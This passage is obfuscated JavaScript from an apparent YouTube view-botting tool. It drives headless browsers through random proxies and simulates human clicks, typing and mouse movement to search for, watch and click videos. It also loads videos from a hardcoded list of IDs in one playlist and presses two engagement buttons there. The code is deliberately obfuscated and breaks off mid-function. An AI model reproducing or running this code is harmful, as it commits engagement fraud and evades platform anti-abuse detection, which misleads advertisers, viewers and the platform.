          return await a1['setDefault' + 'Navigation' + 'Timeout'](0x1aae + 0x1 * 0x183d + -0x32eb), a0 && await useProxy(a1, await getRandomProxy()), await a1['goto'](Z, {
            'timeout': 0x0
          }), a1;
        }
        async function y(Z) {
          return await wait(0x1 * -0x1eac + -0x52 * 0x6f + 0x55c2), await Z['waitForNet' + 'workIdle']({
            'idleTime': 0x1d4c,
            'timeout': 0x0
          }), 0x22db + 0x8bf * 0x1 + -0x2b99;
        }
        async function z(Z) {
          log('watching..' + '.'), await Z['evaluate'](() => {
            var a1;
            (a1 = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x753 + 0xf1f + 0x4 * -0x1f3, 0x1533 + 0x1b3e + -0x306a), a1[Math['floor'](Math['random']() * a1['length'])])['setAttribu' + 'te']('id', '__scope');
          }), await v('#__scope', 0x251 * 0x4 + -0x222f + -0x18eb * -0x1, Z), await y(Z);
          const a0 = await A(Z);
          return await wait(min((0x2f0b * 0x5 + -0x4 * 0x5bab + -0x77 * -0x313) * getRandomInt(0x38d * 0x3 + -0x111b + -0x33b * -0x2, -0xe26 + -0xbf6 + 0x1a21), a0)), -0x1bb0 + 0x65 * 0x18 + 0x1239;
        }
        async function A(Z) {
          return await Z['evaluate'](() => {
            const a0 = {
              'Seconds': 0x3e8,
              'Minutes': 0xea60,
              'Hours': 0x36ee80,
              'Second': 0x3e8,
              'Minute': 0xea60,
              'Hour': 0x36ee80
            };
            let a1 = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
              a2 = -0x167 + 0x13ce + -0x1 * 0x1267;
            a1 = a1['split'](a1['includes']('of') ? '\x20of\x20' : ',\x20')[-0xa6 * -0x6 + -0x14db * 0x1 + 0x18 * 0xb5]['split']('\x20');
            for (let a3 = 0x1e3a + 0x273 * 0x2 + -0x2320; a3 < a1['length']; a3 += -0x1af * 0x16 + -0x25b6 + 0x4ac2)
              a2 += a1[a3] * a0[a1[a3 + (0x17d8 + -0x21 * -0x7a + 0x7 * -0x5a7)]];
            return a2;
          });
        }
        async function B(Z) {
          const aH = d;
          log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await Z['goto'](channels['random'](), {
            'timeout': 0x0
          }), await v('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)', 0xc * 0xce + -0x231 + 0x1 * -0x777, Z), log('clicked\x20vi' + 'deo\x20stuff'), await y(Z), log('page\x20netwo' + 'rk\x20idle\x20x2'), await Z['evaluate'](() => {
            const a2 = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](a4 => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == a4['getAttribu' + 'te']('class'))['slice'](0x11 * -0x149 + -0x1d83 + 0x3362)['map'](a4 => Array['from'](a4['children']))['flat'](-0x9ae + 0x869 + 0x146)['map'](a4 => a4['childNodes'][-0xca + 0x1e5c + 0x9db * -0x3]['childNodes'][-0xf7a + -0x3 * -0xc1a + 0x4 * -0x535]['childNodes'][0x933 + -0x15ad + 0xc7b]['childNodes'][-0x31 * 0x43 + -0xc72 + 0x1945]['childNodes'][0x2 * 0xd4b + -0xb2 * 0x1d + -0x35 * 0x1f]);
            var a3;
            return (a3 = a2)[Math['floor'](Math['random']() * a3['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), a2['map'](a4 => a4['href']);
          }), await wait(getRandomInt(0x1 * 0x692 + 0x1259 + -0x1503, -0x23b1 + 0x6 * 0x2a1 + 0x2773)), await v('#__hookedV' + 'idToWatch', 0x57 * -0x4a + 0x24b2 + -0xb8b, Z), log('woah\x20click' + 'ed\x20some\x20vi' + 'deoo'), await wait(-0x3101 + -0x18de * 0x4 + -0x365 * -0x3d);
          const a0 = await A(Z),
            a1 = min((0x1 * 0x4ede + -0x14d13 + 0x1e895) * getRandomInt(-0xcb0 + 0x1 * 0xff3 + 0x7 * -0x77, 0x4c * -0x4c + -0xab + -0x7c0 * -0x3), a0);
          return log('Watching\x20v' + 'id\x20for\x20' + a1 + ('ms,\x20max\x20ti' + aH(0x1c)) + a0 + 'ms'), await wait(a1), 0x1aa7 * 0x1 + -0x17f1 + -0x3f * 0xb;
        }
        async function C(Z) {
          return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await Z['waitForSel' + 'ector']('.style-sco' + 'pe\x20ytd-ric' + 'h-grid-row'), await Z['evaluate'](() => {
            var a0;
            (a0 = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](a1 => 'contents' != a1['id']), a0[Math['floor'](Math['random']() * a0['length'])])['children'][-0x11 * -0x235 + -0x1234 + -0x1351]['children'][-0x21e8 + 0x8b * -0x2c + -0x112 * -0x36]['children'][0x15ff + 0x126e + 0x4f * -0x83]['children'][-0x217 + -0x33c + 0x553]['children'][0x147e * -0x1 + -0x2441 + -0x49 * -0xc7]['setAttribu' + 'te']('id', 'gottemezez');
          }), await v('#gottemeze' + 'z', 0x1 * -0xb2f + -0x1fc5 + 0x2af5, Z), await y(Z), await z(Z), -0x45e * 0x8 + 0x9 * 0x2cd + 0x9bc;
        }
        async function D(Z) {
          const aI = b;
          log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await Z['evaluate'](() => {
            let a2 = Array['from'](document['querySelec' + 'torAll']('#search'));
            document['getElement' + 'ById']('__searchBo' + 'xReal') || a2['find'](a3 => 'INPUT' === a3['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
          }), await v('#__searchB' + 'oxReal', -0x2297 + -0x1a21 + -0x10c * -0x3a, Z), await q['simKeyboar' + 'dType'](searchTerms['random']() + ''), await v(aI(0x3, 'WAs)') + 'on-legacy', -0x22d5 + -0x1 * -0x2051 + 0x284, Z), log('searching.' + '..'), await Z['waitForFun' + 'ction']('Array.from' + '(document.' + 'getElement' + 'sByTagName' + '(\x22ytd-vide' + 'o-renderer' + '\x22)).length'), await y(Z);
          let a0 = await Z['evaluate'](() => {
            const aJ = c,
              a2 = {
                'seconds': 0x3e8,
                'minutes': 0xea60,
                'hours': 0x36ee80,
                'second': 0x3e8,
                'minute': 0xea60,
                'hour': 0x36ee80
              },
              a3 = (a4 = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))[aJ(0x17)](a6 => a6['childNodes'][-0xf + -0x17d7 + 0x17e8]['childNodes'][-0x119b * 0x1 + 0x2 * 0x11e7 + 0x1 * -0x1232]['childNodes'][0x10c5 + 0x13 * -0x109 + -0x2e7 * -0x1]))[Math['floor'](Math['random']() * a4['length'])];
            var a4;
            const a5 = a3['childNodes'][-0x1 * 0x295 + 0x2 * -0x397 + -0x8 * -0x139]['childNodes'][0x1 * -0x21d + 0xf0e + -0x1 * 0xcf1]['childNodes'][0x26a2 + -0x165b + 0x11 * -0xf5]['ariaLabel'];
            return a3['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'),
              function(a6) {
                let a7 = a6['split'](',\x20')['map'](a9 => a9['split']('\x20'))['flat'](-0x4 * -0x74a + 0x19a8 + 0x9 * -0x617),
                  a8 = 0x791 * 0x2 + -0x901 + -0x621;
                for (let a9 = 0xe6e + -0x1956 + -0x574 * -0x2; a9 < a7['length']; a9 += 0x1a0e + -0x5b * -0x34 + -0x2c88)
                  a8 += a7[a9] * a2[a7[a9 + (0x17 * 0x39 + 0xd27 + -0x1245)]];
                return a8;
              }(a5);
          });
          await v('#__hookedV' + 'idToClick', -0xd2f + -0x3 * -0x173 + 0x46b * 0x2, Z);
          let a1 = min((0x106d3 * 0x1 + 0xc1 * -0x1b9 + 0x13006) * getRandomInt(-0x1cbc + 0x1827 + -0x1 * -0x496, 0x3b9 + -0x531 * -0x7 + -0x2806), a0 + (0x38b * 0x3 + 0x1 * 0xc87 + -0x4 * 0xe8));
          return log('watching\x20v' + 'ideo\x20for\x20' + a1 + 'ms'), await wait(a1), -0x11a5 + -0x7 * -0x232 + 0x124 * 0x2;
        }
        const E = [
          'eHpl-BjXo5' + '8',
          '-PgyODlV6V' + '8',
          'S9EkXX0QYD' + 'U',
          'WvcG1OKdHW' + 'o',
          'b6gOcEwtZ8' + 'U',
          'apdtzA0Dzf' + 'k',
          'YiukDwYv2K' + '4',
          'zK-6UH5R5X' + '8',
          'bIXqNjtsEf' + '4',
          '3l253rESkw' + 'Q',
          'u6RVZKcN9z' + 'Q',
          '6ImZdwpdwT' + 'A',
          '0qPB5ANSBK' + 'c',
          '92duH3cqn1' + 'M',
          'b5lKI78fw3' + 's',
          'zpCCPZfP8L' + 'I',
          'ES7oooakr-' + 'c',
          '2eWyJ8FBvQ' + '8',
          'O4-B3OFPDf' + 'Q',
          'JFcnGk0_u7' + 'o',
          'AP7d2Ghq6d' + 'U',
          'UizEAwrZAG' + 'I',
          '0FAi5-h8Hj' + '0',
          'CNqA6IYj17' + 'k',
          'tSiKyCpwnS' + 'Y',
          'OrglyeV5xP' + 'Y',
          'BXkB-g4eCc' + 's',
          'Y53CmmpbOJ' + 's',
          'sm5MLz_IrQ' + 'k',
          'EuciRU_Ska' + '0',
          'cCbDCTLyPc' + 'E',
          'Ox7Ng5T7bm' + 'c',
          'TXTaB-dQg-' + '0',
          '3jSWaWgr_A' + '0',
          'xT8nvuxCRB' + 'E',
          '3c4Ab9EmRg' + 'Y',
          '2kScgeNOpL' + '8',
          't22jhowMom' + 'c',
          'HbcDLgkmXL' + 's',
          'JsKZ41uTeg' + 'c',
          'dfU48FRgs0' + 'g',
          '3K9ILewnUk' + 'o',
          'QmKwnRiKhD' + 'k',
          'n3nVsWsL6I' + 'k',
          'noTs52D_Mw' + 'Y',
          'A0tDR4nTTK' + '0',
          '9eBwFca-B1' + '4',
          'moasU30H5l' + 'A',
          '_Mb8oQtSBW' + 'E',
          aK(0x1b) + 'M',
          '-pYA-gjkQ8' + 's',
          '5d-dB6tZZA' + 'o',
          '8H2AiOV0oE' + 'o',
          'mI7aiKDGde' + 'w',
          'D-IMDYrj35' + '4',
          'gKgFiEgghy' + 'g',
          'mjVwfjJ2nj' + 'k',
          '6auDBi-D2H' + 'M',
          'X89-SWNdIE' + 'k',
          'T5Pn4LhIwj' + 'M',
          'wVnKGSjY3i' + '8',
          'g11NJftxw1' + '4',
          '9zHirkfEKk' + 'k',
          'ZyGS_AMbIa' + '4',
          'yG6bwB17ZP' + 's',
          'aytHiLe0s6' + 'U',
          'cGe-Mpw_F1' + 'w',
          'eMK7xV_nxZ' + 'o',
          'epJ2MAKa1Y' + 'Q',
          '5BNbKKMUhE' + 'o',
          'oxpAvc6tDP' + '8',
          'jRcc-NIR2R' + 'I',
          '258btO4mFw' + '4',
          'pXjJAUvSbQ' + 'A',
          '63-irfPjh2' + 'c',
          'xbrDZAFf3Q' + 's',
          'MVHMtRlesU' + 'g',
          'zed05qfHMB' + 'I',
          'nkhkxKUHsY' + 'g',
          'n4cSAqR9H1' + 'Q',
          'gOUPndcj7z' + 'I',
          'n3HBTTDHoX' + '8',
          'XIgMFHPIXv' + '4',
          'oQHKMky-_K' + 'c',
          'zfDgTzZ2nh' + '0',
          '1PYettRo-D' + 'M',
          aK(0xe) + '4',
          '2DAgWTlXae' + '8',
          'keouUYA5hI' + 'k',
          'F7i7wRlGCd' + 'c',
          'uToD2c0CdJ' + 'c',
          'Y8DzpdFZZ8' + '8',
          '-rrH657DAa' + 'o',
          'QTrEEWtDks' + '4',
          'TWTSnQDuad' + 'Y',
          'a0GUyvgnzg' + 'c',
          'eSReWZQyKd' + 'E',
          'D_5pMqdKSs' + '4',
          'm0ie8gHS00' + 'I',
          '6WosqMq9ej' + 'o',
          'i0afAOlon_' + '4',
          'j_fe6PfxW4' + 'Y',
          'GfPzi8SYr0' + 'w',
          'MSgZhNCwff' + 'M',
          'wxyBC_z6bI' + '8',
          'PkQpV-Fwhs' + 'k',
          'bVD6cWOVhN' + 'U',
          'mjZOpQlHbx' + 'M',
          'k_BXkcdbBO' + 'M',
          'X72oUsFV7q' + '0',
          'lONsILfq-W' + 'Y',
          'Bhe9PyM_s_' + 'Q',
          'Bhe9PyM_s_' + 'Q',
          'h4TBnDkX4y' + 'o',
          'PNBJyHEkfk' + '4',
          'L3iHS__ufc' + 'g',
          'm7aliUAwm_' + 'Y',
          'FuPVf85zMi' + 'w',
          'gtupAeNTDS' + 'M',
          'yyJ8zkckoB' + '8',
          'ZDTESiN1eS' + 'w',
          'Fo6x16DkoR' + 'o',
          'IAJqRxhVqO' + 'k',
          'KAgwII8TGj' + 'o',
          'o4tLCshmlb' + 'M',
          'dLj5fIupdA' + 'o',
          '_Xl_-b9P4U' + 'Q',
          'V3NxxpUUfW' + 'E',
          'J3ygeDEMnO' + 'w',
          'HcP_xmdwsl' + 'c',
          'M9g0h7px2_' + 'M',
          'b5WfUvcSgr' + 'U',
          'JGHnIshsoC' + 'E',
          'x2gfhCLHd9' + '4',
          'M5Fr8G0ma9' + 'o',
          '3sGeIBfFlC' + 'M',
          'k74y4KOJ2m' + '4',
          'pTHJB0S8E-' + 'U',
          'KaIrXJLfYP' + 'M',
          '0cisZkywhg' + 'Q',
          '0dVzItbl9E' + 'w',
          't0EqnhcSb1' + 's',
          'MuiXtvo1RY' + 'E',
          'Nj-3KC6knH' + 'w',
          'B19HbETNi5' + '8',
          'yKN_QkroH6' + 's',
          'U9ExFM1pji' + '0',
          'sONzDfjKhL' + '4',
          'n3Kj8zEfew' + 'U',
          'nXLGQ7QeoG' + 'Y',
          'OQFQiwiM-P' + 'Y',
          'UtPRpKRTtH' + 'U',
          'E56Myp0BzE' + 'E',
          '7DjOp_JM2Z' + 'w',
          'rNFLQFz_G1' + 'g',
          '1r2pKoVAdj' + 'M',
          'gm3eiv6UND' + 'M',
          'yOiROfjxzX' + 'o',
          'lt2AcxC_ap' + 'g',
          'bObEme2BDO' + 'E',
          '6Ut6HbJmW4' + 'w',
          'fUs0TtQQTo' + '0',
          '_phHS3FAgW' + 'Q',
          '1f8sU4l3dP' + '4',
          'HwTSLUd53K' + '8',
          'EpP2ymD_QG' + 'A',
          'TQ69QFqmbo' + 'I',
          'wA8BqUka_u' + '0',
          'bc8Ey-vuR5' + 'M',
          'PZ_uLi7ULl' + '0',
          'smu5FsnhwF' + '4',
          'dv1JluwoOb' + 'c',
          'nHotP0jbcv' + 'A',
          'iIjYNEmrVv' + 'M',
          'SeP-OZAiPb' + 'c',
          'v52PClvMFt' + 'k',
          '3loLqIPxTS' + '0',
          'jVu9mOzbSq' + 'U',
          '73SAN1vOrV' + 'k',
          'YLPxp4ntym' + 's',
          'YWXfelRk3b' + 'Q',
          'CsxlLMb6Uj' + 'o',
          'uafGOfwzpa' + 'Q',
          'XIr8qotHOI' + 'E',
          'EcoPCWC3Uh' + 'o',
          'AhOwyT8aIh' + 'g',
          't-Ox7lI5UH' + 's',
          'i08qNmssXe' + 'Q',
          'QrJIU09eD-' + 'g',
          'QvNNCQ-8Rp' + 'E',
          'k5gjnjDFAZ' + 's',
          'h_NQ3y1ek8' + 'U',
          'evPsJlNLy_' + '4',
          'qEPTydgwh4' + 's',
          'LB685ckhuf' + 'E',
          'Lj1EcSMGey' + '0',
          'OE19r7MIMW' + 'Q',
          'u8E3p0Vy-P' + 'Y',
          'f4a5OPFQa7' + 'k',
          'XDo7Q7yUEt' + 'k',
          'Vw_9zw0qHI' + 'c',
          'KGT5nbDsI_' + '8',
          'E008Eql59M' + 'Q',
          'wSOFdefX47' + 'A',
          '2xcv7q3QhR' + 'E',
          'hgfvmcBkc0' + '4',
          '0wP7csnX7k' + '4',
          'Xo0R8WiRSb' + '4',
          '8zNp8EOpGd' + '4',
          'sWYhIJZmoS' + 'E',
          'YdG8U1W-bX' + '0',
          'QeDsoSNml-' + 'c',
          'xW5q77El0x' + '8',
          'ZF14issJFE' + 'Y',
          'TRglEGLLKX' + 'o',
          'UE0SXc5k1e' + 'g',
          '6VY65D8f3D' + 'Q',
          'Iwxuob4fA8' + 'Q',
          'M4elJHCUIi' + 's',
          'GY9WWhO504' + 'k',
          'eErUSxmLDw' + '8',
          'ITQfAfzLj3' + 'I',
          'vbDrCL2FuL' + 'g',
          'KyQ_sUgtbK' + 'U',
          'lbEJcipUp8' + 'I',
          '2SqCn2LreN' + 'g',
          '1i-G2TUn41' + '0',
          's0ru6uK7vi' + '8',
          'gOxiE5UAAD' + 'w',
          'lx1rOOjekc' + '8',
          '5VYN2zA-Si' + 'k',
          'q9rLWEAzoo' + 'k',
          '4KSm3IY7Xz' + 'g',
          'fMqRu_ON-D' + 'E',
          'GfvShU6Sy9' + 'A',
          'OHzOmi1b60' + 'Y',
          'D9oTUKT-_n' + 'A',
          '_BrT2PlUiw' + '0',
          'kuuI4LzKgm' + 'I',
          '78dymyg88r' + 'M',
          'mi0nGt2B-q' + 'o',
          'HaI7BjnwnO' + 'c',
          'xlAEOkIuy7' + 'Y',
          '3VmtckvTXl' + 'U',
          'ed7TWHKDr4' + 'E',
          '2LfTjyVtbf' + 'U',
          'STHlCkloyv' + 'E',
          '-BI_-6YnM6' + 'Y',
          'LSK_G1qCQw' + 'M',
          '4tzqIl6EKV' + 'k',
          '9DshU55EiV' + '8',
          'mBtaEI_6e8' + 's',
          '960lvuduwY' + 'w',
          'XWJH-6J5Ee' + 'g',
          'XLS4qmyCAX' + 'g',
          '8cJDYeRiLn' + 'k',
          'cCaIVrltHz' + 'w',
          '8X2fF4pgM0' + 'E',
          '6s8Xm4wylr' + '4',
          'eFceshvavn' + 'o',
          '2h4g7euqR-' + 'U',
          'ujiBqXnn92' + '8',
          'w9F2NST-9j' + 's',
          'w-oc7F5Mmy' + 'U',
          'UYrmqL3cOD' + 'U',
          '4QB59etj0I' + 'o',
          'MY9MTNgXcN' + 'o',
          'ISBmcKDS5C' + '8',
          'ogIb7A7tvW' + '0',
          '-L583IZF6s' + 'k',
          'NbeKQq29ZL' + '0',
          'SPplDxd74F' + 's',
          aL(0xc, 'iNyi') + 'k',
          'iWzezFWpU7' + 'A',
          'NNCQt1rXXE' + 'Y',
          'bcb_ZhJJK8' + 'g',
          '3KoZGQiY6N' + 'o',
          'aSaXQH8F1_' + 'A',
          'V5nMOhI62o' + 'w',
          'JvlPjRUdId' + '0',
          '2gQHuClLCb' + '0',
          '5e-qDy-uUJ' + 'E',
          'oE8vC0QEWU' + 'E',
          '7cQken99yu' + 'o',
          'pmzu080j7r' + 'I',
          'sVy9F4whP6' + 'o',
          'MJrkylk7iE' + 'c',
          'XYjsTxi6oE' + '8',
          'mKlMouB6tp' + '0',
          'o2yunZQley' + 'A',
          'oRryU9F9Lv' + 's',
          'uzzK-052H0' + 'c',
          'VSvA4rCe-4' + 'M',
          'XURH2u_0fM' + 'I',
          'yfpVL2g_tk' + 'o',
          'AuEEjQ8x9o' + 'w',
          'wWkviY8zBr' + 'c',
          'zt_eubHWhx' + 'c',
          'O_7_BGU3u_' + '0',
          'QFDKBxmOn3' + 'Y',
          'w6gccNWXXv' + 'g',
          'VdNJxbrqdX' + 's',
          'wbi5Dxebvn' + 'I',
          'XEFOREYrJg' + 'k',
          'I2rcRta7WJ' + '0',
          'OP5KGfXHX_' + 'A',
          'w2MUMbbwlm' + 'o',
          'X3bF0nd6kf' + 'w',
          'WDDAhASf9j' + 'w',
          'fRwcV8gjbc' + 'w',
          '7T63gaRThr' + '0',
          'zC8AWIwhbf' + 's',
          'JSkVE0n-ee' + 'o',
          'qiQA5pWWRt' + 'U',
          'QdXCjZtfXu' + 'c',
          'vlBji8TOax' + 'o',
          'pBx_5CbIcp' + 'o',
          'L1Oy5F6ZMO' + 'Q',
          'P0NjLaBed-' + 'E',
          'DR16C4-keB' + '0',
          'LGmpIpu9eD' + 'w',
          'rNkX_A4kBA' + 'Q',
          'QztVMjrEk4' + '0',
          'uOM6m6KL5d' + '4',
          'g-Aju8xrrO' + 'E',
          'DfkDbFk_x9' + '8',
          'Y4NLDaowD6' + 'I',
          'ALSZnqQTuJ' + 'o',
          'xUmB6BpZBE' + 'w',
          'SxNOcZ1s85' + '8',
          '-noeCjO416' + 'k',
          'taPJqXBI8V' + 'Y',
          'YxqbkMi1Is' + '4',
          'vnJTyve2r-' + '4',
          '44lRVYQ38E' + 'Q',
          'QOv1N1X5J-' + 'g',
          'jNjREs7ODT' + 'g',
          'U30ToJo3dd' + 'k',
          'rm7lNIIOQC' + 'Y',
          'mGU6sOPlYv' + 'c',
          '6pwxUXdt6T' + 'Q',
          '6MkJRee35a' + 'Q',
          aL(0x19, 'tV0@') + 'c',
          'gPbhFvEeJ3' + 'M',
          'LWXAxz0MiH' + 'A',
          'L0KQJqfwJJ' + 'Y',
          'GWr33_u0VK' + 'c',
          '4ud3ZPfWkH' + 's',
          'dxSrySC4XM' + 'c',
          'iIM2KZC69W' + '0',
          '8DuJ3BAwME' + 'o',
          'm3BAhe1wsl' + 'Y',
          '02U_3pAZxM' + '8',
          '0e7nidPa97' + 'g',
          'TixW__6Eer' + 'o',
          'q46W8MTRTC' + 'E',
          'Jdxp04Je1O' + 'w',
          'HfP4TO3gfN' + '0',
          '4dUJaeB0qL' + '8',
          'xnL-fRJ3RZ' + 'o',
          'yJbD0Df45u' + 'Q',
          '-pGw8RkSSB' + 'k',
          '7cy86Njsis' + 'M',
          'jbgqvxtauo' + '4',
          'N8M00JjSVI' + 'I',
          'MfR5q6Td3R' + 'c',
          'eHwcx94wcp' + 's',
          'olDgVFgAgP' + 'o',
          'eAAd5BmzXz' + 'M',
          'xgTjQ2sGXd' + '4',
          'ipny6JUbzw' + 's',
          'WOwQ0UxbRj' + '4',
          'h0PKFed2GB' + 's',
          'JxdOrgzq7Z' + '8',
          '-VgpSWWW-8' + 'w',
          '-ix4OizkAn' + 's',
          'd3CRE9y3YV' + 's',
          '4QZlfXxorJ' + 'o',
          'YlDpg8aCs5' + 'M',
          'Qe5WT22-AO' + '8',
          'b_rjBWmc1i' + 'Q',
          '9yjZpBq1XB' + 'E',
          'hPx-RiBKXt' + 'Q',
          'UMqLDhl8PX' + 'w',
          'DlJEt2KU33' + 'I',
          'BWeqoARup-' + 'Q',
          '2Dx76lD8Sc' + 'c',
          'j_nI6G3ZDi' + 'E',
          'zvcUYYN1sx' + 'w',
          'cWRkYo1S3L' + '4',
          'cWRkYo1S3L' + '4',
          'bxC_PN3SRv' + 'I',
          '94m93T_5JL' + 'M',
          'RBSHAH4iWU' + '8',
          'RBSHAH4iWU' + '8',
          'RBSHAH4iWU' + '8',
          'bo9fTeXvSi' + 'A',
          'z6LqXiAK-8' + '0',
          '5tbOspjJ5f' + '0',
          'twQ6kKjtBk' + 'Y',
          'Ig17K38Fy0' + 'Y',
          'ZdlrVDwn_a' + '4',
          'aCT4Lddunx' + 'g',
          'acAvMGQtln' + 'M',
          '8XkcbdSRdO' + '0',
          '0e3GPea1Ty' + 'g',
          'zxYjTTXc-J' + '8',
          '9bqk6ZUsKy' + 'A',
          'plSyrHqUh7' + '8',
          'HkvQywg_uZ' + 'A',
          'lADBHDg-Jt' + 'A',
          'I2O7blSSzp' + 'I',
          'kd2KEHvK-q' + '8',
          'CbUjuwhQPK' + 's',
          'fb7T1v_VHp' + 'E',
          'SpeSpA3e56' + 'A',
          'RQdxHi4_Pv' + 'c',
          'nx2-4l4s4N' + 'w',
          'tUTCq3iiw_' + '4',
          'VDa5iGiPgG' + 's',
          'S-sJp1FfG7' + 'Q',
          'Hm1YFszJWb' + 'Q'
        ];
        async function F(Z) {
          await Z['goto']('https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + E['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y')), await v('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill', 0x617 * 0x5 + -0x2425 + 0x5b3, Z), await v('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill', -0x1512 + -0x1cb7 * 0x1 + 0x31ca, Z);
          const a0 = setInterval(async () => {
            log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await Z['evaluate'](() => {
              setTimeout(() => {
                document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on') ? .['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
              }, 0x1 * -0x2e0 + -0x8 * 0x144 + -0x1 * -0x18b8 + (-0x1e33 + 0x1 * -0x2475 + 0x4690) * Math['random']());
            });
          }, -0x2782 + 0x70e * 0x5 + 0x2f * 0xac);
          await wait(-0x14 * 0x2388 + 0xdc39 * 0x9 + -0x6381);
          try {
            Z['$']('#__lllll') && await v('#__lllll', -0x2306 + 0x26f2 + -0x3eb, Z);
          } catch (a1) {}
          return await wait((-0x4a * 0xe1 + 0x6025 * -0x1 + -0x305 * -0x83) * getRandomInt(-0x1e72 + -0xf * -0x195 + 0x6bb * 0x1, -0x5 * -0x143 + 0xed7 * 0x1 + -0x150d)), clearInterval(a0), 0x4e7 * 0x1 + 0x5 * 0x3e8 + -0x186e;
        }
        const G = [
          D,
          B,
          C,
          F
        ];
        async function H() {
          return await wait(-0xa3 * -0x17 + 0x2195 * 0x1 + -0x2f72 + (0x7 * -0x136 + 0xa * -0x364 + 0x2b2a) * random()), -0x1 * -0x1f69 + -0x121f * 0x2 + -0x2 * -0x26b;
        }
        async function I(Z, a0, ...a1) {
          Check['ia'](Z, Page, Frame), Check['nes'](a0), Check['all'](a1, 'string');
          let a2 = [];
          ! function a5(a6) {
            a2['push'](a6);
            for (const a7 of a6['childFrame' + 's']())
              a5(a7);
          }(Z['mainFrame']());
          const a3 = 'qkdjuqwyhd' + 'uqjidwqdjq' + 'hn' + GSI++,
            [a4] = await Promise['race'](a2['map'](a6 => setWait(a6, a0, a1, a3)));
          return await a4['$']('.' + a3);
        }
        async function J(Z, a0, a1, a2 = 0x34a * -0x9 + 0x72e + 0x166d) {
          if (!Z['fakeUserAc' + 'tion'])
            return warn('Requires\x20F' + 'UA\x20hoist!');
          Check['inst'](a0, ElementHandle), Check['nes'](a1), '_click' === a1 ? await Z['fakeUserAc' + 'tion']['simClickEl' + 'ement'](a0) : '_view' === a1 ? await Z['fakeUserAc' + 'tion']['simMouseMo' + 'veToElemen' + 't'](a0) : await K(Z, [
            'type',
            a1
          ]), a2 && a0 && await a0['dispose']();
        }
        async function K(Z, ...a0) {
          const aN = b,
            aM = d;
          if (!Z['fakeUserAc' + 'tion'])
            throw new Error('Controller' + '\x20still\x20not' + '\x20hoisted!');
          Check['cust'](a0, a1 => a1['every'](a2 => 'string' == typeof a2 || Array['isArray'](a2)));
          for (let a1 of a0)
            if ('object' == typeof a1) {
              const a2 = a1['slice'](-0x1fe4 + 0x13c9 + 0xc1c),
                a3 = a1[-0x2135 * 0x1 + -0x2158 + 0x1 * 0x428d];
              switch (flags['debug'] && log('[DEBUG]\x20Ex' + 'ecuting\x20ac' + 'tionType:', a3, aM(0xf) + 'ents:', a2), a3) {
                case 'waitfunc':
                  {
                    const [a4, a5] = a2;
                    'string' != typeof a4 && warn('[WATCHDOG]' + '\x20FunctionS' + 'tring\x20fail' + 'ure\x20here:', a2),
                    a5 instanceof Page || a5 instanceof Frame || warn('[WATCHDOG]' + '\x20Scope\x20fai' + 'lure\x20here:', a2),
                    await a5['waitForFun' + 'ction'](a4);
                  }
                  break;
                case 'waitsel':
                  {
                    const [a6, a7] = a2;
                    'string' != typeof a6 && warn('[WATCHDOG]' + '\x20FunctionS' + 'tring\x20fail' + aN(0x9, 'DVTk'), a2),
                    a7 instanceof Page || a7 instanceof Frame || warn('[WATCHDOG]' + '\x20Scope\x20fai' + 'lure\x20here:', a2),
                    await a7['waitForSel' + 'ector'](a6);
                  }
                  break;
                case 'type':
                  if ('string' != typeof a2[-0x1d * 0x59 + 0xa02 + 0x1 * 0x13] && (warn('[WATCHDOG]' + '\x20Text\x20fail' + 'ure\x20here:', a2), 'number' == typeof a2[-0xbda + -0x7 * -0xe9 + 0x57b])) {
                    const a8 = a2[0xe84 * 0x1 + 0x20b3 * 0x1 + -0x1 * 0x2f37] + '';
                    warn('[WATCHDOG]' + '\x20Recoverab' + 'le\x20error,\x20' + 'state:', a2[-0xf5 * 0x13 + -0x2aa + 0x14d9 * 0x1], a8), a2[0x2 * 0x5cb + 0x24dc * 0x1 + -0x3072] = a8;
                  }
                  a2[0x1bbe + 0x1 * 0x2089 + -0x3c46] && 'object' != typeof a2[0x18f5 * 0x1 + -0xb6 * -0x20 + -0x2fb4] && warn('[WATCHDOG]' + '\x20option\x20ob' + 'ject\x20failu' + 're\x20here:', a2), await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dType'](a2[-0xfd1 + 0x3ce * 0x1 + -0x19 * -0x7b]);
                  break;
